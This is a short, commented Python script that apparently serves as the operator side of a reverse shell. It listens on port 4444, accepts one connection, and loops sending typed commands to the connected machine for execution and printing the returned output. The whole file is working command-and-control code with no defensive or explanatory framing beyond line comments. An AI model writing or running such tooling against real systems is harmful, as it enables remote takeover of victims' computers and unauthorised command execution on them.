import socket

# Server configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
BUFFER_SIZE = 1024  # Buffer size for receiving data

# Create a socket object
server_socket = socket.socket()

# Bind the socket to all IP addresses of this host
server_socket.bind((SERVER_HOST, SERVER_PORT))
# Enable the server to accept connections (max 5 queued connections)
server_socket.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept any connections attempted
client_socket, client_address = server_socket.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Send a welcome message to the client
message = "Hello and Welcome".encode()
client_socket.send(message)

# Command execution loop
while True:
    # Get the command from the prompt
    command = input("Enter the command for execution: ")
    # Send the command to the client
    client_socket.send(command.encode())
    
    if command.lower() == "exit":
        # If the command is 'exit', break out of the loop
        break
    
    # Receive the command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    # Print the command results
    print(results)

# Close the connection to the client
client_socket.close()
# Close the server connection
server_socket.close()
